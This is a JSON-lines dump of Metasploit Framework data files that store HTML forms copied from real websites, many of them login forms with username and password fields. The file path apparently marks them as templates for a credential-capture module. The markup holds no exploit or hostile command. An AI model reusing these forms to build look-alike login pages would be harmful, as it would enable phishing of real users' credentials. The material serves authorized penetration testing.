{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/uol.com.br.txt", "content": "<form action='http://batepapo.uol.com.br/home.html' target='_blank'> <input class=\"ok\" type=\"image\" src=\"\" /></form><form name='formb' action='http://busca.uol.com.br/www/index.html' method='get' target='_blank'> <input name=\"t\" type=\"hidden\" disabled=\"disabled\" /><input name=\"skin\" type=\"hidden\" value=\"\" disabled=\"disabled\" /><input name=\"id\" type=\"hidden\" value=\"\" disabled=\"disabled\" /><input name=\"rd\" type=\"hidden\" value=\"\" disabled=\"disabled\" /><input name=\"ref\" type=\"hidden\" value=\"\" /><input name=\"ad\" type=\"hidden\" value=\"\" /><input name=\"q\" class=\"texto\" type=\"text\" /><input class=\"ok botao\" type=\"image\" src=\"\" /></form><form action='https://acesso.uol.com.br/login.html?skin=webmail' method='post'> <input name=\"user\" type=\"text\" id=\"usuario\" /><input name=\"pass\" type=\"password\" id=\"senha\" /><input class=\"ok\" type=\"image\" src=\"\" /></form><form name='form_cr' action='' id='painel-conteudo'> </form><form name='horoscopo' action='' target='_blank'> </form><form name='tempobrasil' action='http://tempoagora.uol.com.br/busca.html/' method='post' onsubmit='return tempoacentos()' target='_blank'> <input class=\"bok2\" type=\"image\" src=\"\" /><input name=\"tipoBusca\" type=\"hidden\" id=\"tipoBusca\" value=\"\" /></form><form name='radiouol' action='http://b.radio.musica.uol.com.br/radio/index.php' method='get' onsubmit='return modradiobusca()' target='_blank'> <input name=\"busca\" class=\"input\" type=\"text\" /><input name=\"check\" checked type=\"radio\" value=\"\" /><input name=\"check\" type=\"radio\" value=\"\" /><input type=\"image\" src=\"\" /><input name=\"param1\" type=\"hidden\" value=\"\" /><input name=\"ad\" type=\"hidden\" value=\"\" /><input name=\"ref\" type=\"hidden\" value=\"\" /></form><form action='http://shopping.busca.uol.com.br/busca.html' onsubmit='return shopCompara(this);' target='_blank'> <input name=\"q\" type=\"text\" id=\"inpttxt\" value=\"\" /><input type=\"image\" src=\"\" id=\"buscar\" alt=\"Buscar\" /></form><form name='reportar' action='http://cf5.uol.com.br/envie/enviar3.cfm' method='post' target='iframeErros'> <input name=\"titmateria\" type=\"hidden\" value=\"\" /><input name=\"chmateria\" type=\"hidden\" value=\"\" /><input name=\"estacao\" type=\"hidden\" value=\"\" /><input name=\"coderramos\" type=\"hidden\" value=\"\" /><input name=\"seunome\" type=\"hidden\" value=\"\" /><input name=\"seuemail\" type=\"hidden\" value=\"\" /><input name=\"descricao\" type=\"hidden\" value=\"\" /><input name=\"urlmateria\" type=\"hidden\" value=\"\" /><input name=\"obrigado\" type=\"hidden\" value=\"\" /></form><form action='http://todaoferta.busca.uol.com.br/' id='to-search' target='_blank'> <input name=\"q\" class=\"text\" type=\"text\" value=\"\" onclick=\"this.value = '';\" /><input class=\"send\" src=\"\" type=\"image\" alt=\"Buscar\" /></form>", "timestamp": "2025-10-24T23:41:37.412822"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ups.com.txt", "content": "<form name='frmCountry' action='/' onsubmit='return popLanguage(frmCountry, frmCountry.cookie, frmCountry.setCookie);'> <input name=\"Site\" type=\"hidden\" value=\"\" /><input name=\"inputImgTag\" src=\"/img/btn_arrow_large.gif\" type=\"image\" alt=\"Go\" /><input name=\"setCookie\" class=\"rad\" type=\"checkbox\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:37.751140"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/usps.com.txt", "content": "<form name='gs' action='http://search.usps.com/search' method='get' id='gs' onsubmit='return bCheckQuery(document.gs.q)'> <input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"sort\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"num\" type=\"hidden\" value=\"\" /><input name=\"numgm\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" id=\"q\" /><input name=\"srchGo\" src=\"/common/images/07/usps_hm_bt_srch_go.gif\" type=\"image\" id=\"srchGo\" border=\"0\" vspace=\"0\" height=\"17\" hspace=\"0\" alt=\"Go\" width=\"31\" /></form><form name='getTrackNum' action='http://trkcnfrm1.smi.usps.com/PTSInternetWeb/InterLabelInquiry.do' method='post' onsubmit='return getTrackNum_validator(this)'> <input name=\"strOrigTrackNum\" type=\"text\" id=\"trackField\" /><input name=\"trackGo\" src=\"/common/images/07/usps_hm_bt_srch_go.gif\" type=\"image\" id=\"trackGo\" border=\"0\" vspace=\"0\" height=\"17\" hspace=\"0\" alt=\"Go\" width=\"31\" /></form>", "timestamp": "2025-10-24T23:41:38.386217"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/vagos.es.txt", "content": "<form action='http://buscador.wamba.com/buscar/index.php' id='searchbox_017772635223976849731:wtbj1hs2gsg'> <input name=\"cx\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"80\" type=\"text\" /><input name=\"sa\" type=\"submit\" value=\"\" /></form><form action='login.php?do=login' method='post' onsubmit='md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)'> <input name=\"vb_login_username\" tabindex=\"101\" size=\"10\" class=\"bginput\" type=\"text\" id=\"navbar_username\" accesskey=\"u\" value=\"\" onfocus=\"if (this.value == 'Nombre') this.value = '';\" style=\"font-size: 11px\" /><input name=\"cookieuser\" tabindex=\"103\" type=\"checkbox\" id=\"cb_cookieuser_navbar\" accesskey=\"c\" value=\"\" /><input name=\"vb_login_password\" tabindex=\"102\" size=\"10\" class=\"bginput\" type=\"password\" id=\"navbar_password\" style=\"font-size: 11px\" /><input tabindex=\"104\" class=\"button\" title=\"Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself.\" type=\"submit\" accesskey=\"s\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"vb_login_md5password\" type=\"hidden\" /><input name=\"vb_login_md5password_utf\" type=\"hidden\" /></form><form action='index.php' method='get'> </form>", "timestamp": "2025-10-24T23:41:38.703837"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/veoh.com.txt", "content": "<form name='topnav_search' action='/search.html' id='topnav_search' method='get'> <input name=\"type\" type=\"hidden\" id=\"type\" /><input name=\"searchId\" type=\"hidden\" value=\"\" /><input name=\"search\" type=\"text\" id=\"query\" onclick=\"fieldClear('topnav_search');\" /></form><form name='homepage_search' action='/search.html' id='homepage_search' method='get' onsubmit='$(searchId2).value=getNewSearchId();searchClear(homepage_search); document.homepage_search.submit();'> <input name=\"type\" type=\"hidden\" id=\"searchType\" value=\"\" /><input name=\"searchId\" type=\"hidden\" id=\"searchId2\" value=\"\" /><input name=\"search\" type=\"text\" oncontextmenu=\"searchClear('homepage_search');\" value=\"\" onclick=\"searchClear('homepage_search');\" /></form><form name='loginForm' class='loginForm' action='https://www.veoh.com/j_acegi_security_check.html' method='post' id='loginForm' onsubmit='return validateLoginForm(loginForm);'> <input name=\"_acegi_security_remember_me\" type=\"hidden\" value=\"\" /><input name=\"j_username\" class=\"inputbox\" type=\"text\" id=\"j_username\" /><input name=\"j_password\" class=\"inputbox\" onkeypress=\"if (checkEnter(event)){document.loginForm.submit();}\" type=\"password\" id=\"j_password\" /></form>", "timestamp": "2025-10-24T23:41:39.006108"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/verizon.net.txt", "content": "<form name='header_search' focus='this.q' action='vzc.portal' method='get'> <input name=\"_nfpb\" type=\"hidden\" value=\"\" /><input name=\"_pageLabel\" type=\"hidden\" value=\"\" /><input name=\"rs\" type=\"hidden\" value=\"\" /><input name=\"web_search_type\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"clientid\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"0\" type=\"text\" style=\"width:451px;\" /><input name=\"imageField\" type=\"image\" src=\"/central/framework/skins/surround/images/go_button.png\" border=\"0\" height=\"25\" alt=\"Search Button\" align=\"top\" width=\"25\" /></form><form name='scot' method='post' onsubmit='return submitScotForm(\"http://ad.doubleclick.net/clk;171718904;22893903;n?http://research.scottrade.com/public/stocks/snapshot/snapshot.asp?id=1&verizon=2&symbol=\");' target='_blank'> <input name=\"Symbol\" size=\"12\" class=\"textfieldcolor\" type=\"text\" value=\"\" onfocus=\"getBlank (this, 'Enter Symbol');\" maxlength=\"110\" /><input type=\"image\" src=\"resources/images/scotTrade/scotTrade_goBtn.gif\" border=\"0\" height=\"12\" width=\"24\" /></form>", "timestamp": "2025-10-24T23:41:39.307966"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/verycd.com.txt", "content": "<form action='http://www.verycd.com/search/folders' method='get'> <input name=\"kw\" type=\"text\" id=\"top-search-input\" value=\"\" style=\"margin-left: 10px; width: 280px;\" /><input class=\"top-search-button\" type=\"submit\" id=\"top-search-lib\" value=\"\" style=\"margin-left: 30px;\" /><input class=\"top-search-button\" type=\"button\" id=\"top-search-site\" value=\"\" /><input class=\"top-search-button\" type=\"button\" id=\"top-search-advance\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:39.637289"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/videosz.com.txt", "content": "<form name='searchbox' action='/search.php?s=0|0|0&lg=us' method='post'> <input name=\"query\" type=\"text\" /><input class=\"button\" type=\"image\" src=\"/images/buttons/search-us.gif\" /><input name=\"query_type\" checked type=\"radio\" value=\"\" /><input name=\"query_type\" type=\"radio\" value=\"\" /></form><form action='/search.php?s=0|0|0&lg=us' method='post'> <input name=\"prov\" type=\"hidden\" value=\"\" /><input type=\"image\" src=\"/images/buttons/show-us.gif\" /><input type=\"image\" src=\"/images/buttons/show-us.gif\" /></form>", "timestamp": "2025-10-24T23:41:39.984498"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/vkontakte.ru.txt", "content": "<form name='login' action='login.php' method='post' id='login'> <input name=\"email\" size=\"20\" class=\"inputText\" type=\"text\" id=\"email\" onclick=\"show('expirePad');\" /><input name=\"pass\" size=\"20\" class=\"inputText\" type=\"password\" id=\"pass\" onclick=\"show('expirePad');\" /><input name=\"expire\" type=\"checkbox\" id=\"expire\" value=\"\" style=\"margin-top:1px; vertical-align: middle;\" /><input type=\"submit\" value=\"\" style=\"color:#fff;border:0;padding:0;margin:0;background:#fff;height:6px;width:6px\" /></form>", "timestamp": "2025-10-24T23:41:40.291596"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/vmn.net.txt", "content": "<form name='searchForm' action='http://search.vmn.net/' method='get' target='_parent'> <input name=\"q\" class=\"field\" type=\"text\" id=\"searchBox\" value=\"\" /><input name=\"btnS\" class=\"submit_button\" type=\"submit\" value=\"\" /><input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"lz\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:40.628047"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/walmart.com.txt", "content": "<form action='/search/search-ng.do' id='searchForm' method='GET'> <input name=\"search_constraint\" type=\"hidden\" id=\"searchValue\" value=\"\" /><input name=\"search_query\" size=\"18\" class=\"SearchInput\" type=\"text\" value=\"\" maxlength=\"100\" /><input name=\"Find\" class=\"FindBtn\" type=\"image\" src=\"\" value=\"\" alt=\"Find\" /><input name=\"ic\" type=\"hidden\" value=\"\" /></form><form name='findStore' action='/cservice/ca_storefinder_results.gsp' method='GET' onsubmit='return validateSFZIP(this.sfsearch_zip.value);'> <input name=\"serviceName\" type=\"hidden\" value=\"\" /><input name=\"sfatt\" type=\"hidden\" value=\"\" /><input name=\"rx_title\" type=\"hidden\" value=\"\" /><input name=\"rx_dest\" type=\"hidden\" value=\"\" /><input name=\"sfsearch_zip\" size=\"10\" class=\"ZIPInput\" type=\"text\" value=\"\" maxlength=\"10\" /><input name=\"#\" class=\"FindStoreBtn\" type=\"image\" src=\"\" value=\"\" alt=\"Find\" /></form><form name='form1' action='x' method='POST' onsubmit='if(!shouldCOPPAPrevent())openThxPopup(\n                    email_source_id,\n                    1178,\n                    email_subscribe,\n                    1,\n                    form1\n                   );else showCOPPAMsgPopup(); return false;' target='_top'> <input name=\"email_subscribe\" type=\"hidden\" value=\"\" /><input name=\"save.x\" type=\"hidden\" value=\"\" /><input name=\"save.y\" type=\"hidden\" value=\"\" /><input name=\"email_email\" size=\"23\" class=\"EmailInput\" type=\"text\" value=\"\" onfocus=\"this.value=''\" maxlength=\"100\" /><input name=\"Sign Up\" class=\"SignUpBtn\" type=\"image\" src=\"\" value=\"\" alt=\"Sign Up\" /></form>", "timestamp": "2025-10-24T23:41:40.947288"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wamu.com.txt", "content": "<form class='fontsizerNoJS' action='#' method='post'> <input name=\"fontnormal\" class=\"selectfontnormal selected\" type=\"submit\" value=\"\" /><input name=\"fontlarger\" class=\"selectfontlarger\" type=\"submit\" value=\"\" /><input name=\"fontlargest\" class=\"selectfontlargest\" type=\"submit\" value=\"\" /></form><form name='globSearch' class='search' action='http://www.wamu.com/search/default.asp' method='GET'> <input name=\"query\" tabindex=\"1000\" size=\"35\" type=\"text\" id=\"searchfield\" accesskey=\"4\" value=\"\" maxlength=\"416\" /><input name=\"searchbutton\" class=\"btn\" type=\"submit\" id=\"searchbutton\" value=\"\" /></form><form class='' action='/public/HomePageNonJSRedirectPage.aspx' method='post'> <input name=\"custom\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form class='loginbox' action='https://online.wamu.com/access/oblix/apps/webgate/bin/webgate.dll?/IdentityManagement/postlogon.hdlr' method='post' id='loginDropdown'> <input name=\"txtUserID\" autocomplete=\"off\" class=\"usernamefield\" type=\"text\" id=\"txtUserID\" /><input name=\"password\" autocomplete=\"off\" class=\"passwordfield\" type=\"password\" id=\"password\" /><input name=\"chkRememberMe\" type=\"hidden\" id=\"chkRememberMe\" value=\"\" /><input checked=\"checked\" type=\"checkbox\" id=\"chkRemember\" onclick=\"toggleRememberMe(this)\" /><input class=\"btn\" type=\"submit\" value=\"\" /></form><form class='userblock anonymous' action='https://online.wamu.com/access/oblix/apps/webgate/bin/webgate.dll?/IdentityManagement/postlogon.hdlr' method='POST'> </form><form name='aspnetForm' action='HomePage.aspx?NRMODE=Published&NRNODEGUID=%7bC329B92D-B0F1-457D-9B9A-F4FA17E733C1%7d&NRORIGINALURL=%2fpersonal%2fdefault.asp&NRCACHEHINT=Guest' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"__EVENTVALIDATION\" type=\"hidden\" id=\"__EVENTVALIDATION\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:41.277964"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/warez-bb.org.txt", "content": "<form action='login.php?sid=eda3e836257eb9f520f551fb43630920' method='post'> <input name=\"username\" size=\"10\" class=\"post\" type=\"text\" /><input name=\"password\" size=\"10\" class=\"post\" type=\"password\" maxlength=\"32\" /><input name=\"autologin\" checked=\"checked\" class=\"text\" type=\"checkbox\" /><input name=\"login\" class=\"mainoption\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:41.627173"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/washingtonpost.com.txt", "content": "<form name='headersearch' action='http://www.washingtonpost.com/cgi-bin/search99.pl' method='post' onsubmit='return validateHeaderKeyword();'> <input name=\"keywords\" class=\"srch-input-gray\" type=\"text\" value=\"\" onfocus=\"clearGlobalNavSearchHdr();\" style=\"width:205px; font:normal 11px arial;\" /><input type=\"image\" src=\"\" alt=\"Search\" /><input name=\"searchsection\" type=\"hidden\" value=\"\" /><input name=\"searchdatabase\" checked=\"checked\" type=\"radio\" value=\"\" style=\"width:13px; height:13px; padding:0; margin:0;\" /><input name=\"searchdatabase\" type=\"radio\" value=\"\" style=\"width:13px; height:13px; padding:0; margin:0;\" /></form><form name='myform' style='display: inline;'> </form><form name='calendar' action='http://financial.washingtonpost.com/custom/wpost/html-qcn.asp' id='Form1'> <input name=\"symb\" class=\"mkt-input-gray\" type=\"text\" value=\"\" onfocus=\"clearSearchField();\" /><input name=\"Image1\" type=\"image\" src=\"\" id=\"Image1\" height=\"24\" onclick=\"javascript:document.calendar.submit();\" alt=\"Go\" width=\"24\" /></form><form name='footersearch' action='http://www.washingtonpost.com/cgi-bin/search99.pl' method='post' onsubmit='return validateFooterKeyword();'> <input name=\"keywords\" class=\"srch-input-gray\" type=\"text\" value=\"\" onfocus=\"clearGlobalNavSearchBtm();\" style=\"width:205px; font:normal 11px arial;\" /><input type=\"image\" src=\"\" border=\"0\" height=\"26\" valign=\"bottom\" alt=\"Search\" width=\"24\" /><input name=\"searchsection\" type=\"hidden\" value=\"\" /><input name=\"searchdatabase\" checked type=\"radio\" value=\"\" style=\"width:13px; height:13px; padding:0; margin:0;\" /><input name=\"searchdatabase\" type=\"radio\" value=\"\" style=\"width:13px; height:13px; padding:0; margin:0;\" /></form>", "timestamp": "2025-10-24T23:41:41.955234"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/watch-movies.net.txt", "content": "<form name='loginForm' action='/' method='post'> <input name=\"a\" type=\"hidden\" value=\"\" /><input name=\"uback\" type=\"hidden\" value=\"\" /><input name=\"name\" class=\"input\" type=\"text\" value=\"\" style=\"width:90px;border:1px solid #E4E3D6\" /><input src=\"\" type=\"image\" /><input name=\"pass\" class=\"input\" type=\"password\" value=\"\" style=\"width:90px;border:1px solid #E4E3D6\" /></form><form name='search' action='/search2.php' method='post'> <input xclass=\"input\" name=\"s\" type=\"text\" value=\"\" onclick=\"this.value=''\" style=\"width: 200px;font:12px verdana;font-weight:bold;border:1px solid #AAAAAA;padding:3px;height:22px;vertical-align:top\" /><input type=\"image\" src=\"\" /></form>", "timestamp": "2025-10-24T23:41:42.290177"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/weather.com.txt", "content": "<form name='whatwhere' action='http://www.weather.com/search/enhanced' onsubmit='return checkForm();' method='get'> <input name=\"whatprefs\" type=\"hidden\" value=\"\" /><input name=\"what\" type=\"hidden\" value=\"\" /><input name=\"lswe\" type=\"hidden\" /><input name=\"lswa\" type=\"hidden\" /><input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"where\" onkeypress=\"MyLocationClose('whatwhere')\" type=\"text\" onmouseover=\"\" id=\"whatwhereForm\" value=\"\" onclick=\"MyLocation()\" style=\"width:146px;\" /><input name=\"wxGoButton\" class=\"wxGoButton\" type=\"submit\" id=\"wxGoSearchButton\" value=\"\" style=\"width:35px;\" /></form><form name='locationsearch' action='/search/search' method='get'> <input name=\"where\" type=\"TEXT\" value=\"\" onfocus=\"this.value='';\" style=\"width:160px;border:1px solid #666;padding:2px;margin:0;\" /><input name=\"what\" type=\"hidden\" value=\"\" /><input name=\"lswe\" type=\"hidden\" /><input name=\"lswa\" type=\"hidden\" /><input name=\"from\" type=\"hidden\" value=\"\" /><input type=\"SUBMIT\" id=\"hpVertBoxGO\" value=\"\" alt=\"GO\" onclick=\"stringFilter(where);\" /></form><form name='partnerSearch' class='yahooForm' action='http://www.weather.com/search/partner' onsubmit='return checkPartner();'> <input name=\"Keywords\" class=\"yahooInput\" type=\"Text\" /><input name=\"Search\" class=\"yahooGoButton\" type=\"image\" src=\"\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:42.613440"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/web.de.txt", "content": "<form name='s' action='http://suche.web.de/search/web/' id='formSearch' method='get'> <input name=\"mc\" type=\"hidden\" value=\"\" /><input name=\"su\" type=\"text\" id=\"inpSearchText\" /><input class=\"image\" type=\"image\" src=\"//img.web.de/v/home06/icons/btn-searchform.gif\" id=\"inpSearchSubmit\" value=\"\" /></form><form name='fm' action='https://login.web.de/intern/login/' id='formLogin' method='post'> <input name=\"service\" type=\"hidden\" value=\"\" /><input name=\"server\" type=\"hidden\" value=\"\" /><input name=\"onerror\" type=\"hidden\" value=\"\" /><input name=\"onfail\" type=\"hidden\" value=\"\" /><input name=\"username\" type=\"text\" id=\"inpLoginUsername\" /><input name=\"password\" type=\"password\" id=\"inpLoginPasswd\" /><input name=\"rv_dologon\" class=\"submit\" type=\"submit\" value=\"\" /></form><form action='https://login.web.de/intern/login/' id='formClubLogin' method='post'> <input name=\"service\" type=\"hidden\" value=\"\" /><input name=\"server\" type=\"hidden\" value=\"\" /><input name=\"onerror\" type=\"hidden\" value=\"\" /><input name=\"onfail\" type=\"hidden\" value=\"\" /><input name=\"goto\" type=\"hidden\" value=\"\" /><input name=\"mc\" type=\"hidden\" value=\"\" /><input name=\"username\" type=\"text\" id=\"inpClubLoginUsername\" /><input name=\"password\" type=\"password\" id=\"inpClubLoginPasswd\" /><input class=\"image\" type=\"image\" src=\"//img.web.de/v/home06/icons/btn-club-login.gif\" alt=\"Login\" /></form>", "timestamp": "2025-10-24T23:41:42.967023"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/webshots.com.txt", "content": "<form action='http://daily.webshots.com/login' method='post' id='login-form'> <input name=\"done\" type=\"hidden\" value=\"\" /><input name=\"username\" type=\"text\" id=\"user\" value=\"\" /><input name=\"password\" type=\"password\" id=\"pass\" value=\"\" /></form><form action='http://www.webshots.com/search' id='search-form'> <input name=\"query\" type=\"text\" id=\"query\" value=\"\" /><input name=\"new\" type=\"hidden\" value=\"\" /><input name=\"source\" type=\"hidden\" value=\"\" /></form><form action='http://www.webshots.com/search'> <input name=\"query\" type=\"text\" id=\"portlet-query\" /></form><form action='http://www.webshots.com/search'> <input name=\"query\" type=\"text\" id=\"footer-query\" /><input name=\"new\" type=\"hidden\" value=\"\" /><input name=\"source\" type=\"hidden\" value=\"\" /></form><form action='redirect'> <input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:43.292688"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wikia.com.txt", "content": "<form name='userlogin' action='index.php' method='post' id='userlogin' style='margin:5px'> <input name=\"wpName\" tabindex=\"1\" size=\"20\" class=\"loginText\" type=\"text\" id=\"wpName1\" style=\"width:100%\" /><input name=\"wpPassword\" tabindex=\"2\" size=\"20\" class=\"loginPassword\" type=\"password\" id=\"wpPassword1\" style=\"width:100%\" /><input name=\"wpRemember\" tabindex=\"4\" type=\"checkbox\" id=\"wpRemember\" value=\"\" /><input name=\"wpLoginattempt\" tabindex=\"5\" type=\"submit\" id=\"wpLoginattempt\" value=\"\" style=\"margin:0;padding:0 .25em;width:auto;overflow:visible;\" /><input name=\"wpMailmypassword\" tabindex=\"6\" type=\"submit\" id=\"wpMailmypassword\" value=\"\" style=\"margin:0;padding:0 .25em;width:auto;overflow:visible;\" /></form><form action='/wiki/Special:Search' id='searchform'> <input name=\"search\" type=\"text\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:43.626703"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wikipedia.org.txt", "content": "<form action='http://www.wikipedia.org/search-redirect.php' id='searchform'> <input name=\"search\" size=\"20\" type=\"text\" id=\"searchInput\" style=\"vertical-align: top; padding: 0; margin: 0; font-size: 1.2em;\" /><input name=\"go\" class=\"searchButton\" type=\"submit\" value=\"\" style=\"vertical-align: top; padding: 0; margin: 0; font-size: 120%;\" /><input name=\"go\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:43.985002"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wordreference.com.txt", "content": "<form class='lookup' action='http://www.wordreference.com/enit/translation.asp' method='get' style='display:block;margin:5px'> <input tabindex=\"1\" name=\"enit\" id=\"si\" maxlength=\"200\" /><input tabindex=\"3\" name=\"b\" title=\"Search\" type=\"submit\" value=\"\" /></form><form name='choose' action='http://www.wordreference.com/es/translation.asp' method='GET'> <input name=\"tranword\" type=\"text\" id=\"indexbox\" /><input name=\"dict\" type=\"radio\" id=\"enesi\" value=\"\" onclick=\"document.cookie='llang=enesi; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/es/translation.asp?tranword=' + escape(document.choose.tranword.value);\" /><input name=\"dict\" type=\"radio\" id=\"eseni\" value=\"\" onclick=\"document.cookie='llang=eseni; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/es/en/translation.asp?spen=' + escape(document.choose.tranword.value);\" /><input name=\"B10\" type=\"submit\" value=\"\" /><input name=\"dict\" type=\"radio\" id=\"enfri\" value=\"\" onclick=\"document.cookie='llang=enfri; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/enfr/' + encodeURIComponent(document.choose.tranword.value);\" /><input name=\"dict\" type=\"radio\" id=\"freni\" value=\"\" onclick=\"document.cookie='llang=freni; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/fren/' + encodeURIComponent(document.choose.tranword.value);\" /><input name=\"dict\" type=\"radio\" id=\"eniti\" value=\"\" onclick=\"document.cookie='llang=eniti; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/enit/' + encodeURIComponent(document.choose.tranword.value);\" /><input name=\"dict\" type=\"radio\" id=\"iteni\" value=\"\" onclick=\"document.cookie='llang=iteni; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/iten/' + encodeURIComponent(document.choose.tranword.value);\" /><input name=\"dict\" type=\"radio\" id=\"eneni\" value=\"\" onclick=\"document.cookie='llang=eneni; expires=Thu, 10 Sep 2009 20:47:11 UTC; path=/;domain=wordreference.com';if(document.choose.tranword.value!='')location.href = 'http://www.wordreference.com/definition/' + encodeURIComponent(document.choose.tranword.value);\" /></form>", "timestamp": "2025-10-24T23:41:44.656462"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wow-europe.com.txt", "content": "<form name='topSearch' id='topSearch' onsubmit='return searchCall(en)'> <input name=\"searchBox\" class=\"searchBoxForm\" id=\"searchBox\" value=\"\" onfocus=\"if(this.value!='') this.value=''\" onblur=\"if(this.value=='') this.value='Search the site'\" /></form>", "timestamp": "2025-10-24T23:41:44.968701"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wowarmory.com.txt", "content": "<form id='historyStorageForm' method='GET'> </form><form name='formSearch' action='search.xml' method='get' onsubmit='javascript: return menuCheckLength(document.formSearch);'> <input name=\"searchQuery\" size=\"16\" type=\"text\" id=\"armorySearch\" value=\"\" onfocus=\"javascript: checkClear();\" maxlength=\"72\" onblur=\"javascript: checkBlur();\" /><input name=\"searchType\" type=\"hidden\" value=\"\" /><input size=\"2\" type=\"button\" id=\"dummy\" onblur=\"javascript: hideDropBox();\" /></form><form name='loginRedirect' id='loginRedirect' method='post'> <input name=\"passThrough\" type=\"hidden\" id=\"passThrough\" value=\"\" /><input name=\"redirectUrl\" type=\"hidden\" id=\"redirectUrl\" /></form><form name='formDropdownRegion' id='formDropdownRegion' style='height: 0px;'> <input size=\"2\" type=\"button\" id=\"dummyRegion\" onfocus=\"javascript: dropdownMenuToggle('dropdownHiddenRegion');\" style=\"position: relative; left: -5000px;\" onblur=\"javascript: if(!varOverRegion) document.getElementById('dropdownHiddenRegion').style.display='none';\" /></form><form name='formDropdownLang' id='formDropdownLang' style='height: 0px;'> <input size=\"2\" type=\"button\" id=\"dummyLang\" onfocus=\"javascript: dropdownMenuToggle('dropdownHiddenLang');\" style=\"position: relative; left: -5000px;\" onblur=\"javascript: if(!varOverLang) document.getElementById('dropdownHiddenLang').style.display='none';\" /></form>", "timestamp": "2025-10-24T23:41:45.338966"}
